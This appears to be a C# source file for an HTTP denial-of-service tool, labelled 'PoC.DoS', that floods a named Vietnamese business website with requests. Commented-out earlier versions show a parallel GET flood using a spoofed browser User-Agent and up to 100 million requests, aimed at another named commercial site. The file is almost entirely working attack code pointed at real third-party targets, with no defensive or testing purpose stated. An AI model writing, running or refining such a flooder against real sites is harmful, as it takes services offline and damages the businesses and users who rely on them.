using PoC.DoS.Services;

class Program
{
    static async Task Main(string[] args)
    {
        HttpClient client = new HttpClient();
        string url = "https://janco.com.vn/";

        var service = new DoSService();
        await service.RunAsync(client, url, 10);       

    }
}


//int[] items = Enumerable.Range(1, 10).ToArray();
//int[] NumberOfRequest = Enumerable.Range(1, 100).ToArray();
//while (true)
//{
//    var options = new ParallelOptions { MaxDegreeOfParallelism = Environment.ProcessorCount };
//    try
//    {
//        await Parallel.ForEachAsync(items, options, async (item, state) =>
//        {
//            var tasks = NumberOfRequest.Select(x => RunAsync());

//            await Task.WhenAll(tasks);

//        });
//    }
//    catch (InvalidOperationException ex)
//    {
//        // Xử lý lỗi ở đây
//        Console.WriteLine(ex.Message);
//    }
//}

//async Task RunAsync()
//{
//    var c = new CancellationTokenSource();
//    client.GetAsync(url, c.Token);
//    await Task.Delay(100);
//    c.Cancel();
//}


//class Program
//{
//    static async Task Main(string[] args)
//    {
//        string url = "https://chungauto.vn/";
//        var httpClient = new HttpClient();
//        httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36");

//        //var semaphore = new SemaphoreSlim(Environment.ProcessorCount * 20);
//        int[] items = Enumerable.Range(1, 100000000).ToArray();

//        try
//        {
//            await Parallel.ForEachAsync(items, async (item, state) =>
//            {
//                //await semaphore.WaitAsync();

//                try
//                {
//                    var cts = new CancellationTokenSource();
//                    await httpClient.GetAsync(url, cts.Token);                    
//                    //await Task.Delay(100);
//                    //cts.Cancel();
//                }
//                catch (Exception ex)
//                {
//                    Console.WriteLine(ex.Message);
//                }
//                finally
//                {
//                    //semaphore.Release();
//                }


//            });
//        }
//        catch (InvalidOperationException ex)
//        {
//            Console.WriteLine(ex.Message);
//        }
//    }
//}
